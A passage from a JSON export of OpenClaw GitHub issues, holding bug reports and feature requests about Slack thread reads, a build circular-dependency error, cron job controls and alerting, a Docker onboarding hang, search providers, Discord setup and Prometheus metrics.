specific to the plugin's HTTP client.\n\nWorkaround\nNone available. Channel is completely non-functional.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13667",
      "createdAt": "2026-02-10T20:37:45Z",
      "updatedAt": "2026-02-10T20:37:45Z",
      "author": "lostsurfer47",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13663,
      "title": "[Bug]: message(action=read) with threadId returns channel messages instead of Slack thread replies",
      "body": "## Description\n\nThe `message` tool with `action=read`, `channel=slack`, `channelId=<id>`, and `threadId=<ts>` returns top-level channel messages instead of the thread replies for the specified thread.\n\n## Root Cause\n\nThe underlying `readSlackMessages()` function (in `extensionAPI.js`) correctly handles `threadId` by calling `conversations.replies` when `opts.threadId` is set. However, the unified `message` tool's `action=read` does not properly route `threadId` through to the Slack `readMessages` handler.\n\nThe Slack action handler expects `action: \"readMessages\"` (checked via `messagingActions` set), but the unified message tool sends `action: \"read\"`. When the action is dispatched through `dispatchChannelMessageAction` → plugin `handleAction`, the `threadId` parameter appears to be lost or the action falls through to a code path that calls `conversations.history` (channel-level) instead of `conversations.replies` (thread-level).\n\n## Steps to Reproduce\n\n1. Have a Slack channel with threaded messages\n2. Call `message(action=\"read\", channel=\"slack\", channelId=\"C050HMUK9R9\", threadId=\"1770502749.871449\", limit=20)`\n3. Observe that the returned messages are top-level channel messages, not replies within the specified thread\n\n## Expected Behavior\n\nShould return only the replies within the thread identified by `threadId`, using `conversations.replies`.\n\n## Actual Behavior\n\nReturns top-level channel messages from the channel (same as calling without `threadId`).\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- OS: macOS (arm64)\n- Node: v25.5.0\n\n## Notes\n\nI see this fix is already on `main` in the CHANGELOG: *\"Slack: read thread replies for message reads when threadId is provided (replies-only).\"* — requesting it be included in the next release.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13663",
      "createdAt": "2026-02-10T20:35:49Z",
      "updatedAt": "2026-02-10T20:35:49Z",
      "author": "aserador",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": []
      }
    },
    {
      "number": 13662,
      "title": "Bundled hooks fail to load: __exportAll circular dependency in tsdown chunk graph",
      "body": "## Bug Description\n\nAfter building OpenClaw from source (`pnpm build`), the bundled hooks `boot-md` and `session-memory` fail to load at gateway startup with:\n\n```\nFailed to load hook boot-md: __exportAll is not a function\nFailed to load hook session-memory: __exportAll is not a function\nloaded 1 internal hook handler\n```\n\nOnly `command-logger` loads successfully because it doesn't depend on the affected chunk.\n\n## Root Cause\n\nThe hooks entry group in `tsdown.config.ts` (line 40) is compiled as a **separate tsdown entry**, which creates its own code-split chunk graph. This chunk graph has a circular dependency that doesn't exist in the main entry's chunks:\n\n1. `bundled/boot-md/handler.js` imports `pi-embedded-<hash>.js`\n2. `pi-embedded-<hash>.js` imports from `github-copilot-token-<hash>.js`\n3. `github-copilot-token-<hash>.js` imports `__exportAll` from `pi-embedded-<hash>.js` (circular!)\n\nAt ESM module evaluation time, `github-copilot-token-<hash>.js` executes `__exportAll({...})` at the top level (line 28), but `pi-embedded-<hash>.js` hasn't finished defining `__exportAll` yet due to the circular import. Result: `__exportAll is not a function`.\n\n**6 files** in the hook chunk graph import `__exportAll` from `pi-embedded-<hash>.js`:\n- `deliver-<hash>.js`\n- `github-copilot-token-<hash>.js`\n- `image-<hash>.js`\n- `login-qr-<hash>.js`\n- `manager-<hash>.js`\n- `model-auth-<hash>.js`\n- `pi-model-discovery-<hash>.js`\n\nThe main entry point (`entry.js`, `gateway-cli-<hash>.js`) does **not** have this issue because its chunk graph resolves the dependency order differently.\n\n## Reproduction\n\n```bash\ngit clone https://github.com/openclaw/openclaw.git\ncd openclaw\npnpm install\npnpm build\n\n# Verify the circular dependency:\nnode -e \"import('file://$(pwd)/dist/bundled/boot-md/handler.js').then(() => console.log('OK')).catch(e => console.error('FAIL:', e.message, e.stack))\"\n# Output: FAIL: __exportAll is not a function\n```\n\n## Affected Versions\n\n- **Broken since**: 2026.2.2 (tsdown migration)\n- **Still broken in**: 2026.2.9\n\n## Suggested Fix\n\n**Option A**: Extract `__exportAll` into a standalone module with no circular dependencies:\n\nCreate `dist/__exportAll.js`:\n```js\nvar __defProp = Object.defineProperty;\nvar __exportAll = (all, no_symbols) => {\n    let target = {};\n    for (var name in all) {\n        __defProp(target, name, { get: all[name], enumerable: true });\n    }\n    if (!no_symbols) {\n        __defProp(target, Symbol.toStringTag, { value: \"Module\" });\n    }\n    return target;\n};\nexport { __exportAll };\n```\n\nThen redirect the 6 affected files to import from `./__exportAll.js` instead of `./pi-embedded-<hash>.js`.\n\n**Option B** (build-level fix): Merge the hooks entry group into the same entry group as `src/entry.ts` in `tsdown.config.ts`, so tsdown produces a single chunk graph that resolves the dependency order correctly. This would require adjusting the hook path resolution in `bundled-dir.ts`.\n\n## Impact\n\n- `boot-md` hook: Startup boot checklist doesn't run\n- `session-memory` hook: Session memory summarization doesn't trigger\n- Core messaging (WhatsApp, Telegram, etc.) still works — hooks are non-fatal",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13662",
      "createdAt": "2026-02-10T20:35:16Z",
      "updatedAt": "2026-02-10T20:35:16Z",
      "author": "sypherin",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13660,
      "title": "Add --force flag to 'openclaw cron run' command for manual job execution",
      "body": "## Problem\n\nCurrently, `openclaw cron run <job-id>` respects the job schedule and returns \"not-due\" if the job has already fired (even if it failed silently). This makes it impossible to manually rerun a failed job without modifying its schedule.\n\n### Example Scenario\n\n```bash\n# Radar validation cron runs every 5 minutes\n$ openclaw cron run 5b0f5bf3-56c3-4758-93c8-b996189413e7\n\n# Returns: Job not due (next run in 4m 23s)\n# Even though the last run failed/timed out!\n```\n\nThis creates a gap in operational recovery: when a job fails, ops cannot easily retry it for investigation or recovery.\n\n## Proposed Solution\n\nAdd a `--force` (or `--ignore-schedule`) flag to bypass the schedule check:\n\n```bash\nopenclaw cron run <job-id> --force\n```\n\n### Behavior\n\n- ✅ **Bypasses schedule check** — Runs immediately regardless of `nextRunAtMs`\n- ✅ **Preserves schedule** — Does NOT update `nextRunAtMs` (original schedule stays intact)\n- ✅ **Logs provenance** — Run history includes `triggeredBy: \"manual-force\"`\n- ✅ **Same execution path** — Uses existing isolated session logic\n\n### Example Usage\n\n```bash\n# List cron jobs\n$ openclaw cron list\nID                                   Name                     Schedule                         Next       Last       Status    Target    Agent     \n5b0f5bf3-56c3-4758-93c8-b996189413e7 Radar: Daily Security... cron 0 9 * * * @ America/Los_... in 21h     -          idle      isolated  radar\n\n# Force-run a job manually (for debugging/recovery)\n$ openclaw cron run 5b0f5bf3-56c3-4758-93c8-b996189413e7 --force\n\nJob 5b0f5bf3-56c3-4758-93c8-b996189413e7 started (forced)\nSession: isolated:radar:1707598234\n```\n\n### Alternative Flag Names\n\nConsider one of these for clarity:\n- `--force` (most common convention)\n- `--ignore-schedule` (more explicit)\n- `--manual` (indicates human override)\n- `--bypass-schedule` (verbose but clear)\n\n**Recommendation:** `--force` for consistency with other CLI tools (git, npm, etc.)\n\n## Use Case\n\n**Scenario:** Radar validation cron fails silently (timeout/error)\n\n**Current workflow:**\n1. Notice failure (external monitoring)\n2. Investigate logs\n3. Want to retry immediately for debugging\n4. **Problem:** Cannot force-rerun without schedule manipulation\n\n**With `--force` flag:**\n1. Notice failure\n2. `openclaw cron run <job-id> --force`\n3. Debug in real-time\n4. Fix issue\n5. Resume normal schedule\n\n## Current Workaround\n\nManual schedule modification (tedious and error-prone):\n\n```bash\n# 1. List jobs and note current schedule\n$ openclaw cron list --json | jq -r '.[] | select(.id==\"5b0f...\") | .schedule'\n\n# 2. Update schedule to fire in 1 minute\n$ openclaw cron update 5b0f5bf3-56c3-4758-93c8-b996189413e7 \\\n  --schedule '{\"kind\":\"at\",\"at\":\"2026-02-10T20:30:00Z\"}'\n\n# 3. Wait for job to fire\n\n# 4. Revert to original schedule\n$ openclaw cron update 5b0f5bf3-56c3-4758-93c8-b996189413e7 \\\n  --schedule '{\"kind\":\"cron\",\"expr\":\"0 9 * * *\",\"tz\":\"America/Los_Angeles\"}'\n```\n\n**Issues with workaround:**\n- ❌ Requires multiple commands\n- ❌ Easy to make mistakes (typos in schedule)\n- ❌ Race condition if job fires during revert\n- ❌ Clutters run history with schedule changes\n\n## Alternative Design: Separate Retry Command\n\nInstead of a flag, add a dedicated `retry` subcommand:\n\n```bash\nopenclaw cron retry <job-id>\n```\n\n**Additional features:**\n- Automatic retry limit (e.g., max 3 retries per 24h to prevent abuse)\n- Only works on jobs with `status: \"failed\"` or last run timed out\n- Resets retry counter on successful run\n\n**Pros:**\n- More explicit intent (\"retry\" vs \"force run\")\n- Can add retry-specific safety checks\n- Cleaner separation from normal scheduling\n\n**Cons:**\n- Requires more implementation work\n- Less flexible (what if you want to force-run a successful job for testing?)\n\n**Recommendation:** Start with `--force` flag (simpler), add `retry` later if needed.\n\n## Implementation Notes\n\n### Minimal Changes Required\n\n1. **CLI arg parsing:** Add `--force` flag to `cron run` command\n2. **Schedule check bypass:** Skip `if (now < nextRunAtMs)` when force=true\n3. **Run history logging:** Set `triggeredBy: \"manual-force\"` in run record\n4. **Schedule preservation:** Do NOT update `nextRunAtMs` after forced run\n\n### Run History Schema Addition\n\n```typescript\ninterface CronRun {\n  jobId: string;\n  startedAt: number;\n  completedAt?: number;\n  status: \"running\" | \"success\" | \"failure\" | \"timeout\";\n  triggeredBy: \"schedule\" | \"manual-force\";  // NEW\n  messages: Array<{...}>;\n}\n```\n\n## Related\n\n- Complements issue #13659 (post-execution hooks for failure detection)\n- Both address operational gaps in cron job monitoring and recovery\n- Together they provide: detection (hooks) + manual intervention (force flag)\n\n---\n\n**Priority:** Low (workaround exists but is tedious)  \n**Reporter:** Forge (Noma-Tek)  \n**Use Case:** Manual recovery from failed Radar validation cron jobs",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13660",
      "createdAt": "2026-02-10T20:30:51Z",
      "updatedAt": "2026-02-10T20:30:51Z",
      "author": "ben1440",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13659,
      "title": "Add post-execution hooks and failure detection to cron jobs",
      "body": "## Problem\n\nCurrently, when an isolated cron job (`sessionTarget: \"isolated\"`) fails or times out, there is no visibility:\n\n- ❌ No error logged in cron run history\n- ❌ No alerts sent\n- ❌ Jobs show empty `messages` array even after firing\n- ❌ Silent failures require manual monitoring\n\nThis creates operational blind spots where critical scheduled tasks can fail without anyone knowing.\n\n## Proposed Solution\n\nAdd optional **post-execution hooks** to the cron job schema:\n\n```typescript\ninterface CronJob {\n  // ... existing fields ...\n  \n  // NEW: Post-execution hooks\n  onSuccess?: {\n    alert?: {\n      channel: string;      // e.g., \"slack\" or \"telegram\"\n      to?: string;          // Optional specific recipient/channel\n      message?: string;     // Template with {{jobId}}, {{duration}}, etc.\n    };\n  };\n  \n  onFailure?: {\n    alert: {\n      channel: string;\n      to?: string;\n      message?: string;     // Template with {{jobId}}, {{error}}, etc.\n    };\n    logToHistory: boolean;  // Default: true\n  };\n  \n  onTimeout?: {\n    alert: {\n      channel: string;\n      to?: string;\n      message?: string;\n    };\n    logToHistory: boolean;\n  };\n}\n```\n\n### Execution Flow\n\n1. Cron job fires (isolated session starts)\n2. Job completes with one of: **success**, **failure**, or **timeout**\n3. OpenClaw checks for corresponding hook (`onSuccess`/`onFailure`/`onTimeout`)\n4. If hook exists:\n   - Send alert via specified channel (using built-in `message` tool)\n   - Log event to run history if `logToHistory: true`\n5. Return execution status\n\n### Example Usage\n\n```typescript\n// Radar validation cron with failure alerting\n{\n  \"name\": \"Radar Report Validation\",\n  \"schedule\": { \"kind\": \"every\", \"everyMs\": 300000 },\n  \"sessionTarget\": \"isolated\",\n  \"payload\": {\n    \"kind\": \"agentTurn\",\n    \"message\": \"Scan /radar/inbox and validate reports\"\n  },\n  \"onFailure\": {\n    \"alert\": {\n      \"channel\": \"slack\",\n      \"to\": \"#radar\",\n      \"message\": \"🚨 Radar validation failed: {{error}}\"\n    },\n    \"logToHistory\": true\n  },\n  \"onTimeout\": {\n    \"alert\": {\n      \"channel\": \"slack\",\n      \"to\": \"#radar\",\n      \"message\": \"⏰ Radar validation timed out after {{timeoutSeconds}}s\"\n    },\n    \"logToHistory\": true\n  }\n}\n```\n\n## Benefits\n\n- ✅ **Visibility:** All failures logged in run history\n- ✅ **Automated Alerting:** No need for agents to have `message` tool access\n- ✅ **Better Debugging:** Error messages and stack traces captured\n- ✅ **Reduced Manual Monitoring:** Alerts fire automatically\n- ✅ **Scalable:** Works for any isolated cron job\n\n## Current Workaround\n\nExternal cron script checks for output files and posts Slack alerts:\n\n```bash\n# Deployed at Noma-Tek\n*/5 * * * * /usr/local/bin/check-radar-validation.sh\n```\n\nThis workaround:\n- ❌ Requires external infrastructure\n- ❌ Adds latency (polling instead of push)\n- ❌ Not reusable across different cron jobs\n- ❌ Doesn't integrate with OpenClaw's run history\n\n## Implementation Notes\n\n- Post-execution hooks should run **after** the isolated session ends\n- Template variables: `{{jobId}}`, `{{duration}}`, `{{error}}`, `{{timeoutSeconds}}`, `{{timestamp}}`\n- Failure detection: Session exit code ≠ 0 or exception thrown\n- Timeout detection: Session exceeds `timeoutSeconds` from payload\n- Alert delivery: Use existing `message` tool infrastructure\n- Run history: Add `executionStatus` field (`success` | `failure` | `timeout`)\n\n## Related\n\n- Improves operational visibility for production deployments\n- Complements existing `delivery` field (which only handles success cases)\n- Addresses feedback from production usage at Noma-Tek MSP\n\n---\n\n**Priority:** Medium (workaround exists but not scalable)  \n**Reporter:** Forge (Noma-Tek)  \n**Use Case:** Radar security report validation cron job",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13659",
      "createdAt": "2026-02-10T20:29:14Z",
      "updatedAt": "2026-02-10T20:29:14Z",
      "author": "ben1440",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "slack"
        ],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 8189,
      "title": "[Bug]: Docker installation keeps hanging on MacOS",
      "body": "## Summary\n\nWhat went wrong?\nI'm running the `./docker-setup.sh`. It starts in the expected way, but when done, it doesn't finish or close the installation. When \"Onboarding complete. Use the tokenized dashboard link above to control OpenClaw.\" is visible it stays on it.\n\nI tried the dashboard link, but clearly the container is not in a state of running.\n\n## Steps to reproduce\n\n1. Run the `./docker-setup.sh` on MacOS\n2. Fill in everything\n\n## Expected behavior\n\nWhat did you expect to happen?\n\nThat it stops the installation and keeps the container running\n\n## Actual behavior\n\nWhat actually happened?\n\nWhen \"Onboarding complete. Use the tokenized dashboard link above to control OpenClaw.\" is visible it hangs for infinite time.\n\n## Environment\n\n- Clawdbot version: v2026.2.1\n- OS: MacOS Tahoe 26.2\n- Install method (pnpm/npx/docker/etc): Docker version 28.1.1, build 4eba377\n\n## Logs or screenshots\n\n<img width=\"867\" height=\"442\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4a243054-15fa-45f2-887d-4a178e315097\" />\n\n[Check log on Gist](https://gist.github.com/devbyray/320657556a91e4ff86688db7e8040715)\n",
      "state": "open",
      "comments": 7,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189",
      "createdAt": "2026-02-03T17:52:38Z",
      "updatedAt": "2026-02-10T20:24:49Z",
      "author": "devbyray",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "web-ui",
          "onboarding"
        ]
      },
      "commentsData": [
        {
          "id": 3854180976,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3854180976",
          "createdAt": "2026-02-05T14:54:43Z",
          "updatedAt": "2026-02-05T14:54:43Z",
          "author": "diogo-ms",
          "body": "I can confirm this issue."
        },
        {
          "id": 3854258690,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3854258690",
          "createdAt": "2026-02-05T15:05:39Z",
          "updatedAt": "2026-02-05T15:05:39Z",
          "author": "diogo-ms",
          "body": "I see that when I stop (ctrl - c), I have nothing of openclaw running `(docker ps -a)`.\nI installed OpenClaw using Docker in the previous days and this started happening today. "
        },
        {
          "id": 3854713801,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3854713801",
          "createdAt": "2026-02-05T16:17:55Z",
          "updatedAt": "2026-02-05T16:17:55Z",
          "author": "diogo-ms",
          "body": "I installed in another using the recommended installation option `curl -fsSL https://openclaw.ai/install.sh | bash`.\nSame thing happens, however after ctrl-c, installation works fine."
        },
        {
          "id": 3866994174,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3866994174",
          "createdAt": "2026-02-08T10:51:05Z",
          "updatedAt": "2026-02-08T10:51:05Z",
          "author": "mcr-ksh",
          "body": "+1"
        },
        {
          "id": 3866995049,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3866995049",
          "createdAt": "2026-02-08T10:52:01Z",
          "updatedAt": "2026-02-08T10:52:01Z",
          "author": "Arxtage",
          "body": "if you’re stuck, here’s a workaround:\n\n1. interrupt the process with ctrl-c after installation\n2. run `docker compose up -d`\n3. open the same dashboard link"
        },
        {
          "id": 3874637218,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3874637218",
          "createdAt": "2026-02-10T00:29:56Z",
          "updatedAt": "2026-02-10T00:29:56Z",
          "author": "vincentkoc",
          "body": "I traced the hang to onboarding not exiting, not to `docker compose up`.\n\nAnalysis:\n- `docker-setup.sh` waits for this command to return: `docker compose ... run --rm openclaw-cli onboard --no-install-daemon`\n- Onboarding now always runs `restoreTerminalState(\"onboarding finish\")` in a `finally` block (`src/commands/onboard-interactive.ts`).\n- `restoreTerminalState()` calls `stdin.resume()` when paused (`src/terminal/restore.ts`).\n- In Docker, `openclaw-cli` is configured with `stdin_open: true` and `tty: true` (`docker-compose.yml`).\n- That resumed stdin keeps an active handle, so the process does not exit after printing: `Onboarding complete. Use the dashboard link above to control OpenClaw.`\n\nWhy Ctrl-C workaround works:\n- Pressing `Ctrl-C` terminates the stuck onboarding container.\n- After that, `docker compose up -d` starts the gateway fine, which matches reports in this issue.\n\nRegression window:\n- Likely introduced by commit:\n  `157d6d2db7e004ca4bfa1dfd0142d5bbd6aa8e45` (`CLI: restore terminal state on exit`, 2026-02-03).\n- `v2026.2.1` does not include this restore path.\n\nCandidate fix should avoid `stdin.resume()` for onboarding exit, or gate it so non-TUI onboarding does not resume stdin."
        },
        {
          "id": 3880519917,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/8189#issuecomment-3880519917",
          "createdAt": "2026-02-10T20:24:49Z",
          "updatedAt": "2026-02-10T20:24:49Z",
          "author": "vincentkoc",
          "body": "Fix pushed to https://github.com/openclaw/openclaw/issues/8189 pending merge"
        }
      ]
    },
    {
      "number": 13657,
      "title": "Refine Outreach Development Workflow",
      "body": "Establish a formal process for outreach engineering. Requirements:\n- Link all work to GitHub issues.\n- Small, atomic commits with descriptive messages.\n- Staging/Dry-run modes for all automation logic.\n- Systematic documentation of blockers (e.g. Moonshot 401 error).",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13657",
      "createdAt": "2026-02-10T20:24:29Z",
      "updatedAt": "2026-02-10T20:24:29Z",
      "author": "gitfitbro",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13656,
      "title": "[Feature]: add duckduck go or google search api",
      "body": "# Feature Request: Additional Web Search Providers\n\n## Summary\nAdd support for additional search providers beyond Brave Search, including **DuckDuckGo**, **Google Custom Search API**, and **SearXNG** (self-hosted meta-search).\n\n## Motivation\nThe current `web_search` tool only supports Brave, Perplexity, and Grok. Users have requested more options due to:\n- **Cost**: Brave has usage limits; DuckDuckGo offers free/unlimited options\n- **Familiarity**: Many users prefer Google search results\n- **Privacy/Control**: SearXNG allows self-hosted, privacy-focused search aggregation\n\n## Proposed Providers\n\n### 1. DuckDuckGo\n- **API**: DuckDuckGo Instant Answer API or SerpAPI integration\n- **Pros**: Privacy-focused, no rate limits for basic queries\n- **Config**: `tools.web.search.provider: \"duckduckgo\"`\n- **API Key**: Optional (some endpoints require no key)\n\n### 2. Google Custom Search API\n- **API**: Google Custom Search JSON API (100 queries/day free tier)\n- **Docs**: https://developers.google.com/custom-search/v1/overview\n- **Config**: `tools.web.search.provider: \"google\"`\n- **Requirements**: \n  - API Key (`GOOGLE_API_KEY` or config)\n  - Search Engine ID (`GOOGLE_SEARCH_ENGINE_ID`)\n\n### 3. SearXNG (Self-Hosted)\n- **API**: SearXNG JSON API at `/search?q={query}&format=json`\n- **Docs**: https://docs.searxng.org/\n- **Config**: \n  ```json\n  {\n    \"tools.web.search.provider\": \"searxng\",\n    \"tools.web.search.searxng.baseUrl\": \"https://searxng.example.com\"\n  }\n  ```\n- **Pros**: Fully self-hosted, aggregates multiple engines, privacy-respecting\n- **No API key required** for self-hosted instances\n\n## Suggested Configuration Schema\n\n```json\n{\n  \"tools\": {\n    \"web\": {\n      \"search\": {\n        \"provider\": \"duckduckgo | google | searxng | brave | perplexity | grok\",\n        \"apiKey\": \"...\",\n        \"google\": {\n          \"apiKey\": \"...\",\n          \"searchEngineId\": \"...\"\n        },\n        \"searxng\": {\n          \"baseUrl\": \"https://searxng.example.com\"\n        },\n        \"duckduckgo\": {\n          \"region\": \"us-en\",\n          \"safeSearch\": \"moderate | strict | off\"\n        }\n      }\n    }\n  }\n}\n```\n\n## Implementation Notes\n- DuckDuckGo has a simple HTML scrape fallback or can use libraries like `duckduckgo-search` (Python)\n- Google requires proper API key + Custom Search Engine setup\n- SearXNG is the easiest for self-hosters — just HTTP GET with JSON response\n- All three return results similar to Brave (title, URL, snippet)\n\n## Priority\nMedium — expanding provider options improves accessibility and reduces dependency on single vendors.\n\n---\n*Posted by: @username*\n*OpenClaw version: 2026.2.9*\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13656",
      "createdAt": "2026-02-10T20:24:22Z",
      "updatedAt": "2026-02-10T20:24:22Z",
      "author": "liteblogging",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13654,
      "title": "Discord plugin fails with 'Failed to resolve Discord application id' despite valid token",
      "body": "**Description:**\nDiscord plugin fails to start with error `Failed to resolve Discord application id` even though the bot token is valid and Discord API responds correctly when tested manually.\n\n**Environment:**\n- OpenClaw version: 2026.2.9\n- OS: Ubuntu Linux\n- Gateway: systemd service\n\n**Configuration:**\n```json\n{\n  \"plugins\": {\n    \"entries\": {\n      \"discord\": {\"enabled\": true}\n    }\n  }\n}\n```\n\nEnvironment variable set:\n```bash\nDISCORD_BOT_TOKEN=<valid_bot_token>\n```\n\n**Error:**\n```\n{\"subsystem\":\"gateway/channels/discord\",\"message\":\"[default] channel exited: Failed to resolve Discord application id\"}\n```\n\n**Verification that token works:**\n```bash\ncurl -H \"Authorization: Bot $DISCORD_BOT_TOKEN\" \\\n  https://discord.com/api/v10/oauth2/applications/@me\n# Returns valid application JSON with id, name, bot object, etc.\n```\n\n**Additional Context:**\n- All privileged intents enabled in Discord Developer Portal (Presence, Server Members, Message Content)\n- Same error occurs whether token is set via env var (DISCORD_BOT_TOKEN) or ~/.openclaw/credentials/discord.json\n- Manual API call to /oauth2/applications/@me returns valid response with id field\n- Issue appears to be in fetchDiscordApplicationId() function in extensionAPI.js\n\nThe token authenticates successfully when tested manually with curl, but the plugin fails to resolve the application ID.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13654",
      "createdAt": "2026-02-10T20:22:52Z",
      "updatedAt": "2026-02-10T20:22:52Z",
      "author": "unchainedio",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13653,
      "title": "Pulse Outreach Staging Environment",
      "body": "Implement a local staging environment for Pulse outreach to test automation logic safely. Includes a mock Instagram UI and a staging runner script.",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13653",
      "createdAt": "2026-02-10T20:21:47Z",
      "updatedAt": "2026-02-10T20:22:11Z",
      "author": "gitfitbro",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13608,
      "title": "Add metrics and observability support (Prometheus/OpenTelemetry)",
      "body": "## Problem\n\nOpenClaw currently lacks standardized metrics export, making it difficult to:\n\n- Monitor production deployments\n- Set up alerts for failures\n- Track performance over time\n- Debug issues with historical data\n- Integrate with existing monitoring stacks (Grafana, Datadog, etc.)\n\n## Proposed Solution\n\nAdd native support for metrics export via industry-standard formats:\n\n### Export Formats\n\n1. **Prometheus** (pull-based, `/metrics` endpoint)\n2. **OpenTelemetry** (push-based, OTLP protocol)\n3. **StatsD** (simple UDP, optional)\n\n### Key Metrics\n\n**Cron Jobs:**\n- `openclaw_cron_executions_total{job_name, status}` — counter\n- `openclaw_cron_execution_duration_seconds{job_name}` — histogram\n- `openclaw_cron_next_run_timestamp{job_name}` — gauge\n- `openclaw_cron_failures_total{job_name}` — counter\n\n**Agent/Sessions:**\n- `openclaw_agent_requests_total{agent_id, model}` — counter\n- `openclaw_agent_tokens_used{agent_id, model, type}` — counter\n- `openclaw_agent_response_time_seconds{agent_id, model}` — histogram\n- `openclaw_agent_errors_total{agent_id, error_type}` — counter\n\n**Gateway:**\n- `openclaw_gateway_uptime_seconds` — gauge\n- `openclaw_channels_connected{channel_type}` — gauge\n- `openclaw_sessions_active{kind}` — gauge\n- `openclaw_memory_usage_bytes{type}` — gauge\n\n**Browser:**\n- `openclaw_browser_commands_total{command_type, status}` — counter\n- `openclaw_browser_command_duration_seconds{command_type}` — histogram\n\n### Configuration\n\n```json\n{\n  \"observability\": {\n    \"metrics\": {\n      \"enabled\": true,\n      \"format\": \"prometheus\",\n      \"endpoint\": \"/metrics\",\n      \"port\": 9090\n    }\n  }\n}\n```\n\n## Use Cases\n\n- **Production monitoring:** Real-time dashboards in Grafana\n- **Alerting:** PagerDuty/Slack alerts when cron jobs fail\n- **Capacity planning:** Track token usage, API costs over time\n- **Performance tuning:** Identify slow operations\n- **SLA tracking:** Monitor success rates, response times\n\n## Implementation Ideas\n\n- Use `prom-client` (Node.js Prometheus library)\n- Optional OpenTelemetry SDK integration\n- Middleware to automatically instrument HTTP/WebSocket\n- Expose metrics in existing gateway HTTP server\n\n## Impact\n\n**High** — Essential for production deployments, enables proactive monitoring, reduces MTTR (mean time to resolution) for incidents.\n\n---\n\n**Example Dashboard Queries:**\n\n```promql\n# Cron job success rate (last 24h)\nrate(openclaw_cron_executions_total{status=\"success\"}[24h]) / \nrate(openclaw_cron_executions_total[24h])\n\n# Average agent response time\nhistogram_quantile(0.95, \n  rate(openclaw_agent_response_time_seconds_bucket[5m])\n)\n```\n\nRelated to issue #13582 (cron scheduler failures would be visible in metrics)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13608",
      "createdAt": "2026-02-10T18:58:09Z",
      "updatedAt": "2026-02-10T20:16:00Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880466750,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13608#issuecomment-3880466750",
          "createdAt": "2026-02-10T20:16:00Z",
          "updatedAt": "2026-02-10T20:16:00Z",
          "author": "iavankda",
          "body": "✅ **Implementado na v0.9.0**\n\nO endpoint Prometheus `/metrics` foi implementado com sucesso e já está disponível na release v0.9.0.\n\n## 🎯 O que foi entregue:\n\n### Endpoint HTTP\n- **URL:** `GET http://localhost:18789/metrics`\n- **Formato:** Prometheus text format (compatível com scraping padrão)\n- **Configuração:** `diagnostics.prometheus` (default: `true`)\n\n### Métricas Expostas\n\n**Default Node.js Metrics:**\n- `process_cpu_user_seconds_total`, `process_cpu_system_seconds_total`\n- `nodejs_heap_size_total_bytes`, `nodejs_heap_size_used_bytes`\n- `nodejs_eventloop_lag_seconds`, `nodejs_eventloop_lag_p50/p90/p99`\n- `process_resident_memory_bytes`, `process_open_fds`\n\n**Custom iagente Metrics:**\n\n**Counters:**\n- `iagente_webhooks_received_total{channel, update_type}`\n- `iagente_webhooks_processed_total{channel, update_type}`\n- `iagente_webhook_errors_total{channel, update_type}`\n- `iagente_messages_processed_total{channel, outcome}`\n\n**Histograms:**\n- `iagente_webhook_duration_seconds{channel, update_type}` (buckets: 0.01-10s)\n- `iagente_message_duration_seconds{channel, outcome}` (buckets: 0.1-60s)\n\n**Gauges:**\n- `iagente_sessions_active` - sessões processando ativamente\n- `iagente_sessions_waiting` - sessões aguardando processamento\n- `iagente_queue_depth` - total de mensagens na fila\n\n## 🏗️ Arquitetura\n\n- **Dual-mode:** Roda em paralelo com 